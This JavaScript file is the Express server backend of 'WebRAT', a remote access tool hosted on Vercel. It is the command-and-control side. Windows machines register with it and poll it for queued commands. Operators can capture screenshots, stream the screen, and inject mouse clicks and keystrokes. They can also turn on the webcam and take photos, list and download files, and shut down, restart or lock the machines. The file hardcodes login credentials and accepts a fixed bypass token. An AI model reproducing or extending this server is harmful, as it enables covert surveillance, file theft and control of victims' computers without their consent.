const express = require('express');
const cors = require('cors');

const app = express();

// Security Configuration
const LOGIN_CREDENTIALS = {
  username: 'Jayjay100!',
  password: 'Jayjay100!'
};

// CORS configuration for Vercel
app.use(cors({
  origin: [
    'https://webrat.vercel.app', 
    'http://localhost:5000',
    /^https:\/\/.*\.vercel\.app$/,
    /^http:\/\/localhost:\d+$/
  ],
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'x-session-token']
}));

app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));

// In-memory storage
let authenticatedSessions = new Set();
let connectedDevices = new Map();
let commandQueue = new Map(); // Store commands for devices
let deviceScreenshots = new Map(); // Store latest screenshots
let deviceCameraFeeds = new Map(); // Store camera feeds

// Authentication middleware
const requireAuth = (req, res, next) => {
  const authHeader = req.headers.authorization;
  const sessionToken = req.headers['x-session-token'];
  
  if (authHeader === 'Basic SmF5amF5MTAwITpKYXlqYXkxMDAh' || 
      sessionToken === 'authenticated' ||
      authenticatedSessions.has(req.ip)) {
    next();
  } else {
    res.status(401).json({ error: 'Authentication required' });
  }
};

// Auth Routes
app.get('/api/auth/status', (req, res) => {
  const isAuth = authenticatedSessions.has(req.ip);
  res.json({ 
    authenticated: isAuth,
    user: isAuth ? { username: LOGIN_CREDENTIALS.username } : null
  });
});

app.post('/api/login', (req, res) => {
  const { username, password } = req.body;
  
  if (username === LOGIN_CREDENTIALS.username && password === LOGIN_CREDENTIALS.password) {
    authenticatedSessions.add(req.ip);
    res.json({ 
      success: true, 
      message: 'Login successful',
      user: { username }
    });
  } else {
    res.status(401).json({ error: 'Invalid credentials' });
  }
});

app.post('/api/logout', (req, res) => {
  authenticatedSessions.delete(req.ip);
  res.json({ success: true, message: 'Logged out successfully' });
});

// Device Management Routes
app.get('/api/devices', requireAuth, (req, res) => {
  const devices = Array.from(connectedDevices.values()).map(device => ({
    ...device,
    hasScreenshot: deviceScreenshots.has(device.id),
    hasCameraFeed: deviceCameraFeeds.has(device.id),
    lastSeen: Date.now() - device.lastHeartbeat < 30000 ? 'online' : 'offline'
  }));
  res.json(devices);
});

app.post('/api/devices/register', (req, res) => {
  const { deviceId, name, osInfo, capabilities } = req.body;
  
  const deviceData = {
    id: deviceId,
    name: name || `Windows-${deviceId.slice(-4)}`,
    type: 'windows',
    ip: req.ip,
    osInfo: osInfo || {},
    capabilities: capabilities || [],
    status: 'online',
    lastHeartbeat: Date.now(),
    connectedAt: Date.now()
  };
  
  connectedDevices.set(deviceId, deviceData);
  
  if (!commandQueue.has(deviceId)) {
    commandQueue.set(deviceId, []);
  }
  
  res.json({ success: true, message: 'Device registered successfully' });
});

app.post('/api/devices/:deviceId/heartbeat', (req, res) => {
  const { deviceId } = req.params;
  const device = connectedDevices.get(deviceId);
  
  if (device) {
    device.lastHeartbeat = Date.now();
    device.status = 'online';
    connectedDevices.set(deviceId, device);
  }
  
  res.json({ success: true });
});

// Command Management
app.get('/api/devices/:deviceId/commands', (req, res) => {
  const { deviceId } = req.params;
  const commands = commandQueue.get(deviceId) || [];
  
  // Clear commands after sending
  commandQueue.set(deviceId, []);
  
  res.json({ commands });
});

app.post('/api/devices/:deviceId/command', requireAuth, (req, res) => {
  const { deviceId } = req.params;
  const { command, type, data } = req.body;
  
  const device = connectedDevices.get(deviceId);
  if (!device) {
    return res.status(404).json({ error: 'Device not found' });
  }
  
  const commands = commandQueue.get(deviceId) || [];
  commands.push({
    id: Date.now().toString(),
    type,
    command,
    data,
    timestamp: Date.now()
  });
  commandQueue.set(deviceId, commands);
  
  res.json({ success: true, message: `${type} command queued` });
});

// Screen Control
app.post('/api/devices/:deviceId/screenshot', requireAuth, (req, res) => {
  const { deviceId } = req.params;
  const device = connectedDevices.get(deviceId);
  
  if (!device) {
    return res.status(404).json({ error: 'Device not found' });
  }
  
  const commands = commandQueue.get(deviceId) || [];
  commands.push({
    id: Date.now().toString(),
    type: 'screenshot',
    command: 'take_screenshot',
    timestamp: Date.now()
  });
  commandQueue.set(deviceId, commands);
  
  res.json({ success: true, message: 'Screenshot requested' });
});

app.post('/api/devices/:deviceId/screen/start', requireAuth, (req, res) => {
  const { deviceId } = req.params;
  const device = connectedDevices.get(deviceId);
  
  if (!device) {
    return res.status(404).json({ error: 'Device not found' });
  }
  
  const commands = commandQueue.get(deviceId) || [];
  commands.push({
    id: Date.now().toString(),
    type: 'screen_stream',
    command: 'start_screen_stream',
    data: { interval: 500 }, // 2 FPS
    timestamp: Date.now()
  });
  commandQueue.set(deviceId, commands);
  
  res.json({ success: true, message: 'Live screen view started' });
});

app.post('/api/devices/:deviceId/screen/stop', requireAuth, (req, res) => {
  const { deviceId } = req.params;
  const device = connectedDevices.get(deviceId);
  
  if (!device) {
    return res.status(404).json({ error: 'Device not found' });
  }
  
  const commands = commandQueue.get(deviceId) || [];
  commands.push({
    id: Date.now().toString(),
    type: 'screen_stream',
    command: 'stop_screen_stream',
    timestamp: Date.now()
  });
  commandQueue.set(deviceId, commands);
  
  res.json({ success: true, message: 'Live screen view stopped' });
});

app.post('/api/devices/:deviceId/screen/click', requireAuth, (req, res) => {
  const { deviceId } = req.params;
  const { x, y, button } = req.body;
  const device = connectedDevices.get(deviceId);
  
  if (!device) {
    return res.status(404).json({ error: 'Device not found' });
  }
  
  const commands = commandQueue.get(deviceId) || [];
  commands.push({
    id: Date.now().toString(),
    type: 'mouse_click',
    command: 'mouse_click',
    data: { x, y, button: button || 'left' },
    timestamp: Date.now()
  });
  commandQueue.set(deviceId, commands);
  
  res.json({ success: true, message: 'Mouse click sent' });
});

app.post('/api/devices/:deviceId/keyboard', requireAuth, (req, res) => {
  const { deviceId } = req.params;
  const { text, key } = req.body;
  const device = connectedDevices.get(deviceId);
  
  if (!device) {
    return res.status(404).json({ error: 'Device not found' });
  }
  
  const commands = commandQueue.get(deviceId) || [];
  commands.push({
    id: Date.now().toString(),
    type: 'keyboard',
    command: text ? 'type_text' : 'press_key',
    data: { text, key },
    timestamp: Date.now()
  });
  commandQueue.set(deviceId, commands);
  
  res.json({ success: true, message: 'Keyboard input sent' });
});

// Camera Control
app.post('/api/devices/:deviceId/camera/start', requireAuth, (req, res) => {
  const { deviceId } = req.params;
  const device = connectedDevices.get(deviceId);
  
  if (!device) {
    return res.status(404).json({ error: 'Device not found' });
  }
  
  const commands = commandQueue.get(deviceId) || [];
  commands.push({
    id: Date.now().toString(),
    type: 'camera',
    command: 'start_camera_stream',
    data: { quality: 'medium' },
    timestamp: Date.now()
  });
  commandQueue.set(deviceId, commands);
  
  res.json({ success: true, message: 'Camera stream started' });
});

app.post('/api/devices/:deviceId/camera/stop', requireAuth, (req, res) => {
  const { deviceId } = req.params;
  const device = connectedDevices.get(deviceId);
  
  if (!device) {
    return res.status(404).json({ error: 'Device not found' });
  }
  
  const commands = commandQueue.get(deviceId) || [];
  commands.push({
    id: Date.now().toString(),
    type: 'camera',
    command: 'stop_camera_stream',
    timestamp: Date.now()
  });
  commandQueue.set(deviceId, commands);
  
  res.json({ success: true, message: 'Camera stream stopped' });
});

app.post('/api/devices/:deviceId/camera/photo', requireAuth, (req, res) => {
  const { deviceId } = req.params;
  const device = connectedDevices.get(deviceId);
  
  if (!device) {
    return res.status(404).json({ error: 'Device not found' });
  }
  
  const commands = commandQueue.get(deviceId) || [];
  commands.push({
    id: Date.now().toString(),
    type: 'camera',
    command: 'take_photo',
    timestamp: Date.now()
  });
  commandQueue.set(deviceId, commands);
  
  res.json({ success: true, message: 'Photo capture requested' });
});

// File Management
app.post('/api/devices/:deviceId/files/list', requireAuth, (req, res) => {
  const { deviceId } = req.params;
  const { path } = req.body;
  const device = connectedDevices.get(deviceId);
  
  if (!device) {
    return res.status(404).json({ error: 'Device not found' });
  }
  
  const commands = commandQueue.get(deviceId) || [];
  commands.push({
    id: Date.now().toString(),
    type: 'file_management',
    command: 'list_files',
    data: { path: path || 'C:\\' },
    timestamp: Date.now()
  });
  commandQueue.set(deviceId, commands);
  
  res.json({ success: true, message: 'File list requested' });
});

app.post('/api/devices/:deviceId/files/download', requireAuth, (req, res) => {
  const { deviceId } = req.params;
  const { filepath } = req.body;
  const device = connectedDevices.get(deviceId);
  
  if (!device) {
    return res.status(404).json({ error: 'Device not found' });
  }
  
  const commands = commandQueue.get(deviceId) || [];
  commands.push({
    id: Date.now().toString(),
    type: 'file_management',
    command: 'download_file',
    data: { filepath },
    timestamp: Date.now()
  });
  commandQueue.set(deviceId, commands);
  
  res.json({ success: true, message: 'File download requested' });
});

// System Control
app.post('/api/devices/:deviceId/system/shutdown', requireAuth, (req, res) => {
  const { deviceId } = req.params;
  const device = connectedDevices.get(deviceId);
  
  if (!device) {
    return res.status(404).json({ error: 'Device not found' });
  }
  
  const commands = commandQueue.get(deviceId) || [];
  commands.push({
    id: Date.now().toString(),
    type: 'system',
    command: 'shutdown',
    timestamp: Date.now()
  });
  commandQueue.set(deviceId, commands);
  
  res.json({ success: true, message: 'Shutdown command sent' });
});

app.post('/api/devices/:deviceId/system/restart', requireAuth, (req, res) => {
  const { deviceId } = req.params;
  const device = connectedDevices.get(deviceId);
  
  if (!device) {
    return res.status(404).json({ error: 'Device not found' });
  }
  
  const commands = commandQueue.get(deviceId) || [];
  commands.push({
    id: Date.now().toString(),
    type: 'system',
    command: 'restart',
    timestamp: Date.now()
  });
  commandQueue.set(deviceId, commands);
  
  res.json({ success: true, message: 'Restart command sent' });
});

app.post('/api/devices/:deviceId/system/lock', requireAuth, (req, res) => {
  const { deviceId } = req.params;
  const device = connectedDevices.get(deviceId);
  
  if (!device) {
    return res.status(404).json({ error: 'Device not found' });
  }
  
  const commands = commandQueue.get(deviceId) || [];
  commands.push({
    id: Date.now().toString(),
    type: 'system',
    command: 'lock_screen',
    timestamp: Date.now()
  });
  commandQueue.set(deviceId, commands);
  
  res.json({ success: true, message: 'Screen lock command sent' });
});

// Data Upload Endpoints (for client to send data back)
app.post('/api/devices/:deviceId/upload/screenshot', (req, res) => {
  const { deviceId } = req.params;
  const { imageData, timestamp } = req.body;
  
  deviceScreenshots.set(deviceId, {
    data: imageData,
    timestamp: timestamp || Date.now()
  });
  
  res.json({ success: true, message: 'Screenshot received' });
});

app.post('/api/devices/:deviceId/upload/camera', (req, res) => {
  const { deviceId } = req.params;
  const { imageData, timestamp } = req.body;
  
  deviceCameraFeeds.set(deviceId, {
    data: imageData,
    timestamp: timestamp || Date.now()
  });
  
  res.json({ success: true, message: 'Camera frame received' });
});

// Data Retrieval Endpoints
app.get('/api/devices/:deviceId/screenshot/latest', requireAuth, (req, res) => {
  const { deviceId } = req.params;
  const screenshot = deviceScreenshots.get(deviceId);
  
  if (!screenshot) {
    return res.status(404).json({ error: 'No screenshot available' });
  }
  
  res.json(screenshot);
});

app.get('/api/devices/:deviceId/camera/latest', requireAuth, (req, res) => {
  const { deviceId } = req.params;
  const cameraFrame = deviceCameraFeeds.get(deviceId);
  
  if (!cameraFrame) {
    return res.status(404).json({ error: 'No camera feed available' });
  }
  
  res.json(cameraFrame);
});

// Health and status endpoints
app.get('/api/health', (req, res) => {
  res.json({ 
    status: 'healthy',
    timestamp: new Date().toISOString(),
    devices: connectedDevices.size,
    environment: 'serverless'
  });
});

app.get('/ws', (req, res) => {
  res.json({ 
    message: 'WebSocket endpoint - using HTTP polling for serverless',
    devices: connectedDevices.size 
  });
});

app.get('/', (req, res) => {
  res.json({ 
    message: 'WebRAT Windows Remote Administration API',
    version: '3.0.0',
    environment: 'serverless',
    features: ['live_screen', 'camera_control', 'file_management', 'system_control']
  });
});

// Error handling
app.use((error, req, res, next) => {
  console.error('Server error:', error);
  res.status(500).json({ error: 'Internal server error' });
});

// Cleanup old devices (remove devices that haven't sent heartbeat in 2 minutes)
setInterval(() => {
  const now = Date.now();
  for (const [deviceId, device] of connectedDevices.entries()) {
    if (now - device.lastHeartbeat > 120000) { // 2 minutes
      connectedDevices.delete(deviceId);
      commandQueue.delete(deviceId);
      deviceScreenshots.delete(deviceId);
      deviceCameraFeeds.delete(deviceId);
    }
  }
}, 60000); // Check every minute

module.exports = (req, res) => {
  app(req, res);
};
